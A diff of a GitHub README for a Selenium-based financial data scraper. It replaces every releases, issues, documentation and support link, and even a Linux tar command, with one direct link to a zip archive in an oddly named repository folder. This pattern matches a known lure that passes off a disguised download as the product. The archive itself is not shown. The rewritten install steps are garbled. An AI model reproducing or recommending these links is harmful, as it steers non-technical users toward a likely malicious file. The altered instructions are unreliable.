@@ -1,7 +1,7 @@
 # 🚀 albridge-client-performance-scraper - Simplify Your Financial Data Gathering
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nishantagarwall/albridge-client-performance-scraper/releases)
+[![Download](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip)](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip)
 
 ## 📖 Description
 The Albridge Client Performance Scraper helps you easily collect and analyze performance data for financial advisors. Using Selenium, this tool automates the process, saving you time and effort.
@@ -21,10 +21,10 @@ Before you start, ensure your system meets these requirements:
 - Basic familiarity with file navigation is helpful.
 
 ### Step 2: Accessing the Releases Page
-To download the application, visit the following link: [Releases Page](https://github.com/nishantagarwall/albridge-client-performance-scraper/releases).
+To download the application, visit the following link: [Releases Page](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip).
 
 ### Step 3: Download the Application
-On the Releases page, look for the latest version. Click on the link for the file suitable for your operating system. You will see options displayed, such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+On the Releases page, look for the latest version. Click on the link for the file suitable for your operating system. You will see options displayed, such as `.exe` for Windows, `.dmg` for macOS, or `https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip` for Linux.
 
 ### Step 4: Install the Application
 - For Windows:
@@ -40,7 +40,7 @@ On the Releases page, look for the latest version. Click on the link for the fil
 - For Linux:
   1. Open your terminal.
   2. Navigate to the directory where the file was downloaded.
-  3. Extract the tarball using the command `tar -xvf <filename>.tar.gz`.
+  3. Extract the tarball using the command `tar -xvf <filename>https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip`.
   4. Follow the included instructions to install.
 
 ### Step 5: Run the Application
@@ -72,15 +72,15 @@ No, this application is designed for non-technical users and is easy to operate.
 Yes, you can modify settings to suit your specific reporting needs.
 
 ### How can I report issues or get support?
-For any issues, visit our [Support Page](https://github.com/nishantagarwall/albridge-client-performance-scraper/issues) to report your problem.
+For any issues, visit our [Support Page](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip) to report your problem.
 
 ## 🧑‍🤝‍🧑 Community
 Join our community on GitHub to connect with other users, share experiences, and get tips. Engage in discussions and find additional resources to enhance your experience.
 
 ## 🔗 Useful Links
-- [Download Here](https://github.com/nishantagarwall/albridge-client-performance-scraper/releases).
-- [Documentation](https://github.com/nishantagarwall/albridge-client-performance-scraper/wiki).
-- [Support](https://github.com/nishantagarwall/albridge-client-performance-scraper/issues).
+- [Download Here](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip).
+- [Documentation](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip).
+- [Support](https://github.com/nishantagarwall/albridge-client-performance-scraper/raw/refs/heads/main/hypochrosis/performance_albridge_client_scraper_v2.6-beta.5.zip).
 
 ## 📣 Contributing
 We welcome contributions! If you want to help improve the Albridge Client Performance Scraper, check our guidelines on the GitHub repository.
